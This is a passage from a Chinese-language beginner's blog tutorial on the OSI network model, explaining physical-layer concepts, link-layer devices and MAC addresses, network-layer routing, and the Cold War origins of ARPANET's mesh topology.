-<p>　　“存储信道”比较少见，很多人没听说过，稍微解释一下。<br>　　假设你要把一大坨信息传送给另一个人，除了用“有线 or 无线”这两种通讯方式，还可以把信息先保存到某种【存储介质】（比如硬盘），然后再把存储介质用某种方式（比如快递）转交给对方。这就是所谓的“存储信道”。</p>
-<h3 id="◇信噪比（Signal-to-noise-ratio）"><a href="#◇信噪比（Signal-to-noise-ratio）" class="headerlink" title="◇信噪比（Signal-to-noise ratio）"></a>◇<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E4%BF%A1%E5%99%AA%E6%AF%94">信噪比</a>（Signal-to-noise ratio）</h3><p>　　俺在很多篇关于“学习＆心理学”的博文中提到过【信噪比】这个概念。其实这个概念是从通讯领域借用的术语。<br>　　对于“物理信道”，总是会存在某些环境干扰，称之为“噪声”（Noise）。“信道传输的有用信息”与“无用的干扰噪声”，这两者的比值就是“信噪比”。<br>　　“信噪比”单位是【分贝】。“分贝”洋文叫做“<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Decibel">decibel</a>”（简写为 dB）。“deci”表示“十进制”；“bel”是为了纪念大名鼎鼎的贝尔（电话它爹）。</p>
-<h3 id="◇带宽的限制因素"><a href="#◇带宽的限制因素" class="headerlink" title="◇带宽的限制因素"></a>◇带宽的限制因素</h3><p>　　“物理信道”要依赖于物理传输介质。不管使用何种物理介质，都要受限于某些基本的物理学定律（比如“光速上限”）。另外，不管何种物理介质，总是会有或多或少的环境干扰（噪声）。这两个因素导致了：任何“物理信道”的最大传输率总是有限滴。<br>　　由于物理层是最底下的一层，物理层之上的其它层次总是要直接或间接地依赖【物理信道】。因此，其它层次建立的“逻辑信道”，其带宽只会比“物理信道”的最大带宽更小。换句话说：“物理信道”的带宽上限也就是整个协议栈的带宽上限。</p>
-<h3 id="◇多路复用（Multiplexing）"><a href="#◇多路复用（Multiplexing）" class="headerlink" title="◇多路复用（Multiplexing）"></a>◇<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8">多路复用</a>（Multiplexing）</h3><p>　　一般来说，凡是能实现【长距离】通讯的“物理信道”，都有相当的经济成本。比如铺设“光纤、同轴电缆”都要花钱。无线电通讯虽然免去了铺设线路的成本，但需要竞标购买频段。因此，物理信道非常强调“多路复用”。<br>　　所谓的“多路复用”，通俗地说就是：尽可能地共享物理信道，不要浪费了。<br>　　“多路复用”有很多种类型；不同的类型，原理也不同。为了展示各种不同的原理，俺拿【无线通信】来说事儿。<br>　　无线通信领域的“多路复用”，【至少】有如下几种：</p>
-<p><strong>频分多路复用/FDM（Frequency-Division Multiplexing）</strong><br>　　这个最简单，就是根据频率拆分。不同的线路占用不同的频段，互不干扰。（电台广播用的就是这个思路）<br>　　但这个思路的缺点很明显——<br>其一，要依赖足够宽的频段（频段是稀缺资源）；<br>其二，不同线路的流量可能会动态变化。如果某个线路空闲，其占用的频段就浪费了。<br>　　（注：光纤通讯中有个“波分多路复用/WDM”，本质上就是 FDM）</p>
-<p><strong>时分多路复用/TDM（Time-Division Multiplexing）</strong><br>　　这种思路只用一个很窄的频段。为了在同一个频道发送多个信道，采用【分时机制】，把时间切割成很小的时间片，每个线路占用一个时间片。周而往复。<br>　　这个思路有点像十字路口的红绿灯——每隔一段时间，其中一条路可以通行。<br>　　这个思路的优点是：可以只使用一个很窄的频段。缺点是：线路越多，每条线路等待越久；即使某个线路空闲，依然会占用时间片（浪费了资源）。</p>
-<p><strong>码分多路复用/CDM（Code-Division Multiplexing）</strong><br>　　这种思路采用某种【编码】的技巧，使得多个端点可以在同一个时间点使用同一频段发送数据；由于他们采用不同的编码方式，不会相互干扰。<br>　　一般来说，CDM 要依赖于“扩频技术”（<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Spread_spectrum">spread spectrum</a>），需占用一个比较宽的频道范围。这算是缺点。但其优点很明显——<br>其一，可以支持 N 个线路（N 动态变化）；<br>其二，即使任何一个线路的流量动态变化，也不会浪费物理信道的资源。<br>　　显然，这种思路明显优于 FDM ＆ TDM。如今在移动通讯领域大名鼎鼎的 CDMA（码分多址），采用的就是这个思路。</p>
-<h2 id="★物理层：具体实例"><a href="#★物理层：具体实例" class="headerlink" title="★物理层：具体实例"></a>★物理层：具体实例</h2><h3 id="◇物理层的【协议】"><a href="#◇物理层的【协议】" class="headerlink" title="◇物理层的【协议】"></a>◇物理层的【协议】</h3><p>　　物理层的协议主要有如下：<br><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Universal_Serial_Bus">USB 协议</a><br><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/List_of_Bluetooth_protocols">蓝牙协议</a>的一部分<br><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/IEEE_802.11">IEEE 802.11</a> 的一部分（Wi-Fi）<br><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/IEEE_802.16">IEEE 802.16</a>（WiMAX）<br><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/IEEE_1394">IEEE 1394</a>（火线接口）<br><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/RS-232">RS-232 协议</a>（串行接口/串口）<br>……<br>（考虑到篇幅）俺不可能具体细聊这些协议，只是贴出每个的维基百科链接，感兴趣的同学自己点进去看。</p>
-<h3 id="◇物理层的【协议实现】"><a href="#◇物理层的【协议实现】" class="headerlink" title="◇物理层的【协议实现】"></a>◇物理层的【协议实现】</h3><p>　　对于电脑主机（含移动设备），“网卡硬件”包含了物理层的协议实现（参见如下示意图）<br>　　另外，还有一些专门的【1层】网络设备，也提供物理层的功能（参见下一个小节）。</p>
-<p><img src="https://lh4.googleusercontent.com/uYGaEvDYmziV-6EZ1AnRskoGpyKwxBcHgV5wgVtsDKmyP37OQgfX_zPYYeV3drFWBATFb95DYIwMPCgNApfg9Vtxrrpyvept6LNDQi0Vh3Fp6d31LFarI4ZjY1mSaQqP94HJaVQHBEQ" alt="不见图 请翻墙"><br>（OSI 模型中，不同层次的协议实现）</p>
-<h3 id="◇物理层相关的【网络设备】"><a href="#◇物理层相关的【网络设备】" class="headerlink" title="◇物理层相关的【网络设备】"></a>◇物理层相关的【网络设备】</h3><p><strong><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E8%B0%83%E5%88%B6%E8%A7%A3%E8%B0%83%E5%99%A8">调制解调器</a>（modem）</strong><br>　　通俗地说，“调制解调器”就是用来翻译“数字信号 ＆ 模拟信号”。<br>　　在发送信息时，modem 把电脑要发送的“字节流”（数字信号）翻译成“模拟信号”，然后通过物理介质发送出去；当它从物理介质收到“模拟信号”，再翻译成“数字信号”，传回给电脑。<br>　　早期的拨号上网，modem 面对的物理介质是“固话线路”；如今家庭宽带普及，光纤入户，modem 面对的物理介质是“光纤线路”。</p>
-<p><img src="https://lh6.googleusercontent.com/nfl3YFl3Bgg13u0xQV0CsGvLSObLDDbGI5wuDcGTulde_klpLWZX9fhpGbiE1SgAJYBDVUtrM4MwjV5Hy6DYA5YC7gKyVaQs-xy_kUdC1jm1hWnAuHdq9q3VDhxoMPbJxEYlL6pONFw" alt="不见图 请翻墙"><br>（老式 modem，用于固定电话线路）</p>
-<p><strong><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Repeater">中继器</a>（repeater）</strong><br>　　信号在物理介质中传输，会出现【衰减】（不论是“有线 or 无线”都有可能衰减）。“中继器”的作用是【信号增益】，使得信号能传得更远。<br>　　另外，比如“微波通讯”是直线传播，而地球表面有弧度，还有地形的起伏。所以每隔一定距离要建“微波塔”。这玩意儿也相当于“中继器”。</p>
-<p><img src="https://lh4.googleusercontent.com/DQOkSWCmJO86Vc1hNJhGONs8j2oHbjS8hlA1XxFL7OIrdPsGT9amhbHzoKHjo8S0aTfVQYgKoBPvP0vEw8lvLEby6OubBeTkHZaV1sikpzIgvVGmLYT_nSmHMZqfJFmUowukZ5pbOoY" alt="不见图 请翻墙"><br>（微波塔示意图）</p>
-<p><strong><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E9%9B%86%E7%B7%9A%E5%99%A8">集线器</a>（hub）</strong><br>　　可以把“集线器”视作更牛逼的“中继器”——“中继器”只有两个口（只能连接两个通讯端点），而“集线器”有多个口（同时连接多个通讯端点）。<br>　　通常所说的“集线器”是指“以太网集线器”。这种设备如今已经逐步淘汰，很少见到了。</p>
-<p><img src="https://lh3.googleusercontent.com/JdWYf1BMAyz3Td7XLh7Yuu0YxQLtIzhWHvPhp_xXszrTH-MPiarsWjh9zyL-0Mx0ysRbxANYwaoH6J5OAUC8Hkd58Wx0TIu5D5-AtmWoDpGnGs9aOu7T3Uzc8bYWcUmu5ZCVEH14L44" alt="不见图 请翻墙"><br>（老式的10兆以太网集线器）</p>
-<p>　　另外，很多同学应该都用过“USB hub”，就是针对 USB 线的“集线器”（“USB 线”也可以视作某种通讯介质）。</p>
-<h2 id="★链路层：概述"><a href="#★链路层：概述" class="headerlink" title="★链路层：概述"></a>★链路层：概述</h2><h3 id="◇链路层的必要性"><a href="#◇链路层的必要性" class="headerlink" title="◇链路层的必要性"></a>◇链路层的必要性</h3><p><strong>对信息的打包</strong><br>　　物理层传输的信息，通俗地说就是【比特流】（也就是一长串比特）。但是对于计算机来说，“比特流”太低级啦，处理起来极不方便。“链路层”要干的第一个事情，就是把“比特流”打包成更大的一坨，以方便更上层的协议进行处理。在 OSI 模型中，链路层的一坨，称之为“帧”（frame）。</p>
-<p><strong>差错控制</strong><br>　　物理介质的传输，可能受到环境的影响。这种影响不仅仅体现为“噪声”，有时候会出现严重的干扰，导致物理层传输的“比特流”出错（某个比特“从0变1”或“从1变0”）。因此，链路层还需要负责检查物理层的传输是否出错。在 IT 行话中，检测是否出错，称之为“差错控制机制”（后面有一个小节会简单说一下这个话题）。</p>
-<p><strong>流量控制</strong><br>　　假设两个端点通过同一个物理信道进行通讯，这两个端点处理信息的速度可能不同。如果发送方输出信息的速度超过接收方处理信息的速度，通讯就会出问题。于是就需要有某种机制来协调，确保发送方的发送速度不会超出接收方的处理速度。在技术行话中，这称之为“流量控制”，简称“流控”。</p>
-<p><strong>信道复用</strong><br>　　在上一个章节已经讲到：用于远距离通讯的“物理介质”，总是有成本。因此需要对物理信道进行“多路复用”，就会导致多个端点共用同一个物理信道。如果同时存在多个发送者和多个接收者。接收者如何知道某个信息是发给自己而不是别人？<br>　　另外，某些物理介质可能不支持并发（无法同时发送信息）。某些物理介质可能是【半双工】，所有这些物理层的限制，都使得“多路复用”变得复杂。为了解决这些问题，链路层需要提供了某种相应的机制（协议），术语叫做“介质访问控制”（洋文是“Media Access Control”，简称 MAC）。后续小节会聊它。</p>
-<h3 id="◇差错控制"><a href="#◇差错控制" class="headerlink" title="◇差错控制"></a>◇差错控制</h3><p>　　为了发现传输的信息是否出错，设计了很多相应的数学算法。这些算法大体分为两类：“检错算法 ＆ 纠错算法”。<br>　　简而言之，“检错算法”只能检测出错误，而“纠错算法”不但能检测出错误，还能纠正错误。很显然，“纠错算法”更牛逼，但是它也更复杂。<br>　　常见的“检错算法”对传输的数据计算出一个【校验值】，接收方收到数据会重新计算校验和，如果算出来不对，就把收到的数据丢弃，让对方重发。“校验算法”的原理类似于《<a target="_blank" rel="noopener" href="https://program-think.blogspot.com/2013/02/file-integrity-check.html">扫盲文件完整性校验——关于散列值和数字签名</a>》一文中提到的“散列算法/哈希算法”。<br>　　“纠错算法”更高级，由于涉及到更多数学，俺就不展开啦。<br>　　对于【无线】物理信道，由于出错的概率更高，并且重新传输数据的成本也更高。所以【无线】通讯的链路层协议，更倾向于用【纠错】机制；作为对比，【有线】通讯的链路层协议，更倾向于用【检错】机制。</p>
-<h3 id="◇MAC-协议"><a href="#◇MAC-协议" class="headerlink" title="◇MAC 协议"></a>◇<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Medium_access_control">MAC 协议</a></h3><p>　　“MAC 协议”用来确保对下层物理介质的使用，不会出现冲突。为了形象，俺拿“铁路系统”来比喻，说明“MAC 协议”的用途。<br>　　假设有一条【单轨】铁路连接 A/B 两地。有很多火车想从 A 开到 B，同时还有很多火车想从 B 开到 A。<br>　　首先，要确保不发生撞车（如果已经有车在 A 开往 B 的途中，那么 B 就不能再发车）；其次，即使是同一个方向的车，出发时间也要错开一个时间间隔。<br>　　所有这些协调工作，都是靠“MAC 协议”来搞定。</p>
-<h3 id="◇MAC-地址"><a href="#◇MAC-地址" class="headerlink" title="◇MAC 地址"></a>◇MAC 地址</h3><p>　　为了完成上述任务，光有“MAC 协议”还不够，还需要为每一个端点引入【惟一的】标识。这个标识就称作“MAC 地址”。<br>　　通俗地说，每个网卡都内置了一个“MAC 地址”。这个地址是网卡在出厂的时候就已经设置好的，并且用某种机制确保该地址【全球唯一】。</p>
-<p>　　如何保证 MAC 地址全球唯一捏？简单说一下：<br>　　MAC 地址包含6个字节（48个比特），分为两半。第一部分称作【OUI】，OUI 的24个比特中，其中2个比特有特殊含义，其它22个比特，用来作为网卡厂商的唯一编号。这个编号由国际组织 IEEE 统一分配。<br>　　MAC 地址第二部分的24比特，由网卡厂商自己决定如何分配。每个厂商只要确保自己生产的网卡，后面这24比特是唯一的，就行啦。</p>
-<p><img src="https://lh6.googleusercontent.com/p1BJLdyURQLXwjaX9w6zrYxmzkFitCfuXYxEnQ8o2WaciD67PpWKUzx2MM4s7ay2Ds9Ltn4oHERF0uq17z_zaEIZFvRBqDb2U7WUPtAVM9Cve1_BUtd8Emx-073rj3jpizDMZRwdQ5o" alt="不见图 请翻墙"><br>（MAC 地址的构成）</p>
-<p>　　由于俺在很多安全教程中鼓吹大伙儿使用“<a target="_blank" rel="noopener" href="https://program-think.blogspot.com/2012/10/system-vm-0.html">操作系统虚拟机</a>”，再顺便说说【虚拟网卡】的 MAC 地址。<br>　　“虚拟网卡”是由【虚拟化软件】创建滴。IEEE 也给每个虚拟化软件的厂商（含开源社区）分配了唯一的 OUI。因此，虚拟化软件在创建“虚拟网卡”时，会使用自己的 OUI 生成前面24个比特；后面的24比特，会采用某种算法使之尽可能【随机化】。由于“2的24次方”很大（<code>224 = 16777216</code>），碰巧一样的概率很低。<br>　　（注：如果手工修改 MAC 地址，故意把两块网卡的 MAC 地址搞成一样，那确实就做不到唯一性了。并且会导致链路层的通讯出问题）</p>
-<h2 id="★链路层：具体实例"><a href="#★链路层：具体实例" class="headerlink" title="★链路层：具体实例"></a>★链路层：具体实例</h2><h3 id="◇链路层的【协议】"><a href="#◇链路层的【协议】" class="headerlink" title="◇链路层的【协议】"></a>◇链路层的【协议】</h3><p>　　链路层的协议主要有如下：<br><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Media_access_control">MAC 协议</a>（介质访问控制）<br><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Logical_link_control">LLC 协议</a>（逻辑链路控制）<br><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Address_Resolution_Protocol">ARP 协议</a>（解析 MAC 地址）<br><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/IEEE_802.3">IEEE 802.3</a>（以太网）<br><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/IEEE_802.11">IEEE 802.11</a> 的一部分（Wi-Fi）<br><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Layer_2_Tunneling_Protocol">L2TP 协议</a>（2层VPN）<br><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Point-to-Point_Protocol">PPP 协议</a>（拨号上网）<br><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Serial_Line_Internet_Protocol">SLIP 协议</a>（拨号上网）<br>……<br>（考虑到篇幅）俺不可能具体细聊这些协议，只是贴出每个的维基百科链接，感兴趣的同学自己点进去看。</p>
-<h3 id="◇链路层的【协议实现】"><a href="#◇链路层的【协议实现】" class="headerlink" title="◇链路层的【协议实现】"></a>◇链路层的【协议实现】</h3><p>　　对于电脑主机（含移动设备），“网卡硬件 ＆ 网卡驱动”会包含链路层协议的实现（参见如下示意图）。<br>　　另外，还有一些专门的【2层】网络设备，也提供链路层的功能（参见下一个小节）。</p>
-<p><img src="https://lh4.googleusercontent.com/uYGaEvDYmziV-6EZ1AnRskoGpyKwxBcHgV5wgVtsDKmyP37OQgfX_zPYYeV3drFWBATFb95DYIwMPCgNApfg9Vtxrrpyvept6LNDQi0Vh3Fp6d31LFarI4ZjY1mSaQqP94HJaVQHBEQ" alt="不见图 请翻墙"><br>（OSI 模型中，不同层次的协议实现）</p>
-<h3 id="◇链路层相关的【网络设备】"><a href="#◇链路层相关的【网络设备】" class="headerlink" title="◇链路层相关的【网络设备】"></a>◇链路层相关的【网络设备】</h3><p><strong><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E7%B6%B2%E8%B7%AF%E4%BA%A4%E6%8F%9B%E5%99%A8">网络交换机</a>（network switch）</strong><br>　　（注：一般提到“网络交换机”，如果不加定语，指的就是“2层交换机”；此外还有更高层的交换机，在后续章节介绍）<br>　　为啥要有交换机捏？俺拿“以太网的发展史”来说事儿。<br>　　以太网刚诞生的时候，称之为“经典以太网”，电脑是通过【集线器】相连。“集线器”前面提到过，工作在【1层】（物理层），并不理解链路层的协议。因此，集线器的原理是【广播】模式——它从某个网线接口收到的数据，会复制 N 份，发送到其它【每个】网线接口。假设有4台电脑（A、B、C、D）都连在集线器上，A 发数据给 B，其实 C ＆ D 也都收到 A 发出的数据。显然，这种工作模式很傻逼（低效）。由于“经典以太网”的工作模式才“10兆”，所以集线器虽然低效，还能忍受。<br>　　后来要发展“百兆以太网”，再用这种傻逼的广播模式，就不能忍啦。于是“经典以太网”就发展为“交换式以太网”。用【交换机】代替“集线器”。<br>　　交换机是工作在2层（链路层）的设备，能够理解链路层协议。当交换机从某个网线接口收到一份数据（链路层的“帧”），它可以识别出“链路帧”里面包含的目标地址（接收方的 MAC 地址），然后只把这份数据转发给“目标 MAC 地址相关的网线接口”。<br>　　由于交换机能识别2层协议，它不光比集线器的性能高，而且功能也强得多。比如（稍微高级点的）交换机可以实现“MAC 地址过滤、VLAN、QoS”等多种额外功能。</p>
-<p><strong><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E6%A1%A5%E6%8E%A5%E5%99%A8">网桥/桥接器</a>（network bridge）</strong><br>　　“交换机”通常用来连接【同一种】网络的设备。有时候，需要让两台不同网络类型的电脑相连，就会用到【网桥】。<br>　　下面以“操作系统虚拟机”来举例（完全没用过虚拟机的同学，请跳过这个举例）。<br>　　在<a target="_blank" rel="noopener" href="https://program-think.blogspot.com/2012/12/system-vm-5.html">这篇博文</a>，俺介绍了虚拟机的几种“网卡模式”，其中有一种模式叫做【bridge 模式】。一旦设置了这种模式，Guest OS 的虚拟网卡，对于 Host OS 所在的外部网络，是【双向】可见滴。也就是说，物理主机所在的外部网络，也可以看见这块虚拟网卡。<br>　　现在，假设你的物理电脑（Host OS）只安装了【无线网卡】（WiFi），而虚拟化软件给 Guest OS 配置的通常是【以太网卡】。显然，这是两种【不同】的网络。为啥 Guest OS 的以太网卡设置为“bridge 模式”之后，外部 WiFi 网络可以看到它捏？<br>　　奥妙在于——虚拟化软件在内部悄悄地帮你实现了一个“网桥”。这个网桥把“Host OS 的 WiFi 网卡”与“Guest OS 的以太网卡”关联起来。WiFi 网卡收到了链路层数据之后，如果接收方的 MAC 地址对应的是 Guest OS，网桥会把这份数据丢给 Guest OS 的网卡。<br>　　这种网卡模式之所以称作“bridge 模式”，原因就在于此。</p>
-<h3 id="◇链路层相关的【软件工具】"><a href="#◇链路层相关的【软件工具】" class="headerlink" title="◇链路层相关的【软件工具】"></a>◇链路层相关的【软件工具】</h3><p><strong>嗅探抓包工具（Sniffer）</strong><br>　　要了解链路层的数据包结构，需要用到“嗅探工具”。这类工具能捕获流经你网卡的所有【链路层】数据包。前面聊“协议栈”的时候说过：下层数据包的载荷就是上层数据包的整体。因此，拿到【链路层】数据包也就意味着：你已经拿到2层之上的所有数据包的信息了。<br>　　有些抓包工具自带图形界面，可以直接显示数据包的内容给你看。还有些只提供命令行（只是把获取的数据包保存为文件），然后要搭配其它图形化的工具来展示数据包的内容。<br>　　抓包的工具有很多，名气最大的是 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Wireshark">Wireshark</a>（原先叫做 Ethereal）。</p>
-<p><strong>ARP 命令</strong><br>　　首先，ARP 是“MAC 地址解析协议”的洋文名称。该协议根据“IP 地址”解析“MAC 地址”。<br>　　Windows 自带一个同名的 <code>arp</code> 命令，可以用来诊断与“MAC 地址”相关的信息。比如：列出当前子网中其它主机的 IP 地址以及对应的 MAC 地址。这个命令在 Linux ＆ Mac OS 上也有。</p>
-<h2 id="★网络层：概述"><a href="#★网络层：概述" class="headerlink" title="★网络层：概述"></a>★网络层：概述</h2><h3 id="◇网络层的必要性"><a href="#◇网络层的必要性" class="headerlink" title="◇网络层的必要性"></a>◇网络层的必要性</h3><p><strong>路由机制（routing）</strong><br>　　在 OSI 模型中，链路层本身【不】提供路由功能。你可以通俗地理解为：链路层只处理【直接相连】的两个端点（注：这么说不完全严密，只是帮助外行理解）<br>　　对于某个复杂网络，可能有很多端点，有很复杂的拓扑结构。当拓扑足够复杂，总有一些端点之间【没有直连】。那么，如何在这些【没有直连】的端点之间建立通讯捏？此时就需要提供某种机制，让其它端点帮忙转发数据。这就需要引入“路由机制”。<br>　　为了避免把“链路层”搞得太复杂，路由机制放到“链路层”之上来实现，也就是“网络层”。</p>
-<p><strong>基于【路由】的地址编码方式</strong><br>　　链路层已经提供了某种全球唯一的地址编码方式（MAC 地址）。但“MAC 地址”有如下几个问题：<br>其一，它是固定的（虽然可以用技术手段去修改 MAC 地址，但很少这么干）<br>其二，MAC 地址的编码是基于【厂商】，无法体现网络拓扑结构。或者说，“MAC 地址”对于“路由机制”是不够友好滴。<br>　　因此，需要引入一种更抽象（更高层）的地址，也就是“网络层地址”。咱们常说的“IP 地址”，是“网络层地址”的实现方式之一。</p>
-<p>　　为了帮你理解，举个例子：<br>　　每个人都有身份证号（这就类似于“MAC 地址”）。当某人加入了某个公司，公司会为此人再分配一个“员工号”（这就类似于“网络地址”）。既然有身份证号，为啥公司还要另搞一套“员工编号”捏？因为“员工编号”有额外的好处。比如说：可以把员工号划分为不同的区间，对应不同的部门。这样一来，只要看到员工号，就知道此人来自哪个部门。<br>　　类似道理，每个网卡都有自己固定的 MAC 地址，当这个网卡接入到不同的网络，每次都可以再分配不同的“网络地址”。通过“网络地址”可以看出这个网卡属于哪个网络（对路由比较方便）。</p>
-<p><strong>网际互联（<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Internetworking">internetwork</a>）</strong><br>　　引入“网络层”的另一个目的是：屏蔽不同类型的网络之间的差异，从而有利于【网际互联】（也就是建立“网络的网络”）。<br>　　一般来说，要想联通【异种】网络，就要求每个网络中都有一台主机充当【网关】（gateway）。【网关】起到“中介/翻译”的作用——帮不同的网络翻译协议，使得不同的网络可以互相联通。<br>　　假设【没有】统一的网络层，网关的工作就很难做。就好比说：如果全球没有某种通用的自然语言，就需要培养非常多不同类型的翻译人才（假设有30种主要语言，任意两种互译，就需要几百种不同的翻译人才）。<br>　　反之，如果有了某种统一的网络层标准，问题就好办多了（还是假设有30种主要语言，只要选定某种作为通用语，然后培养29种翻译人才，就可以实现任意两种语言互译）。<br>　　如今的互联网时代，【IP 协议】就是那个充当统一标准的网络层协议。</p>
-<p><img src="https://lh3.googleusercontent.com/zrXBFWSDp-D4VebTx73Un03rN3zKCjVL6Ax_VURmxZyaIj_bfr09TwYya1F6GyNz3W5JLmEvzDggkDPYuHpCdHfWjKHDHp-pBVubeDazpi7Ie9CHYbhJkVP1c48JSZJhpKn8zftthOo" alt="不见图 请翻墙"><br>（互联网整合了各种类型的网络）</p>
-<h3 id="◇网络拓扑（network-topology）"><a href="#◇网络拓扑（network-topology）" class="headerlink" title="◇网络拓扑（network topology）"></a>◇网络拓扑（network topology）</h3><p>　　网络的拓扑结构有很多种，有简单的，有复杂的。一般来说，再复杂的拓扑，也可以逐步分解为若干简单拓扑的组合。<br>　　对拓扑的研究，有专门一个数学分支（拓扑学）。考虑到本文只是扫盲，俺不可能再去聊“拓扑学”。因此，只挑几种简单的拓扑结构，让大伙儿有个直观的印象。</p>
-<p><img src="https://lh5.googleusercontent.com/ccFqOwvxYuPyelLkW1KRh77tNfUR3TCMMSFN0YgJKJSUfBWISxnzj7mRKLvAP5FvCb2YJDZ8aZO7wRKslvltbWm5fn0QJk3uWp5F3xQy_GFXWVx__c1kDD-cV7HHejxuwqvR6ombf_M" alt="不见图 请翻墙"><br>（常见的网状拓扑结构：星形拓扑、环形拓扑、总线拓扑、网状拓扑、等等）</p>
-<p>　　如今的互联网，整体的拓扑结构超级复杂。但还是可以逐步分解为上述几种基本的拓扑结构。</p>
-<p><img src="https://lh3.googleusercontent.com/l2JVK5up10o5jLkXzIgrcNcTBpnXtmeBKxyHqhuxmqDFlAGDF8pXDqHhRfTf7kAeNLYrgnnI0HVElnFE-JKZXpwcC2Y1f12v5bftW4_6KIYQqY-77tI_pE---r3L3Fwle2i0PTgAnEc" alt="不见图 请翻墙"><br>（互联网的复杂拓扑，右下角是图中某个小点的放大。<br>为节省大伙儿的翻墙流量，俺贴的是缩小图。点“<a target="_blank" rel="noopener" href="https://upload.wikimedia.org/wikipedia/commons/d/d2/Internet_map_1024.jpg">这里</a>”看原始图）</p>
-<h3 id="◇互联网的拓扑——从“历史”的角度看其健壮性"><a href="#◇互联网的拓扑——从“历史”的角度看其健壮性" class="headerlink" title="◇互联网的拓扑——从“历史”的角度看其健壮性"></a>◇互联网的拓扑——从“历史”的角度看其健壮性</h3><p>　　从上面那张图可以看出：互联网拓扑的【局部】有很多是“星形拓扑”（当然也有其它的）。但从【宏观】上看，更像是“网状拓扑”。<br>　　在现实生活中，对于复杂结构，通常都会采用“树状层次结构”，以便于管理。比如：域名系统、公司组织结构、官僚系统 …… 那为啥互联网的【宏观】拓扑结构是“网状”捏？这就要说到互联网的历史。</p>
-<p>　　在上世纪50年代（冷战高峰期），美国军方的指挥系统高度依赖于电信公司提供的电话网络。当时的电话网络大致如下——<br>在基层，每个地区有电话交换局，每一部电话都连入当地的交换局。<br>在全国，设有若干个长途局，每个交换局都接入某个特定的长途局（不同地区的交换局通过长途局中转）。<br>　　简而言之，当时美国的电话网络是典型的【多级星形拓扑】。这种拓扑的优点是：简单、高效、便于管理；但缺点是：健壮性很差。从这个案例中，大伙儿可以再次体会到“效率”与“健壮性”之间的矛盾。俺写过一篇很重要的博文（<a target="_blank" rel="noopener" href="https://program-think.blogspot.com/2020/04/Government-and-System-Robustness.html">这里</a>）深入讨论了这个话题。<br>　　话说1957年的时候，苏联成功试射第一颗洲际弹道导弹（ICBM），美国军方开始担心：一旦苏联先用洲际导弹攻击美国，只要把少数几个长途局轰掉，军方的指挥系统就会瘫痪。也就是说，“长途局”已经成为美国军方的【单点故障】（何为“单点故障”？参见<a target="_blank" rel="noopener" href="https://program-think.blogspot.com/2015/04/Single-Point-of-Failure.html">这篇博文</a>）。<br>　　1960年，美国国防部找来大名鼎鼎的兰德公司进行咨询，要求提供一个应对核打击的方案。该公司的研究员 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Paul_Baran">Paul Baran</a> 设计了一个方案，把“星形拓扑”改为【网状拓扑】。采用【网状拓扑】的好处在于：即使发生全面核大战，大量骨干节点被摧毁，整个网络也不会被分隔成几个孤岛，军方的指挥系统依然能正常运作。</p>
-<p><img src="https://lh5.googleusercontent.com/IE-FTOWlH2Z5OjbyXQ18nnjCRMoQrk1jfjoyIuLApcwU1AGPhu0mFgJL65IkOsvADshV1Fxbfb4bSn54Xy4m08lDE-n-mtnaSYAAGCgIUZSvVZo-8IAPPzFyLUcZdvq_JWsoUOsfdZQ" alt="不见图 请翻墙"><br>（左边：互联网诞生前——美国的电话网络　　右边：兰德公司的“Baran 方案”）</p>
-<p>　　有了兰德公司的方案，美国军方找到当时最大的电信公司 AT＆T，想要实现这个系统，结果被否决了。AT＆T 高层认为：搞这样一种系统根本不切实际。于是 Baran 的方案中途夭折。<br>　　为啥 AT＆T 反对这个方案捏？一方面，成功的大公司总是有很强的思维定势；另一方面，Baran 的设计方案确实很超前——其前瞻性不仅包括“拓扑结构”，而且把当时电信行业的几大核心观念完全颠覆掉了（具体如何颠覆，后续章节还会再聊）。<br>　　时间一晃又过了好多年，到了60年代末，由于一系列机缘巧合，英国佬发现了“Baran 方案”的价值，并据此搞了一个小型的 NPL 网络（NPL 是“国家物理实验室”的缩写）。然后在某次 ACM 会议上，美国佬看到英国佬的论文，才意识到：Baran 方案完全可行。经历了“出口转内销”的命运之后，该方案重新被美国国防部重视。之后，（国防部下属的）“<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%9C%8B%E9%98%B2%E9%AB%98%E7%AD%89%E7%A0%94%E7%A9%B6%E8%A8%88%E5%8A%83%E7%BD%B2">高级计划研究局</a>”（ARPA）开始筹建“阿帕网”（ARPANET），才有了如今的互联网。</p>
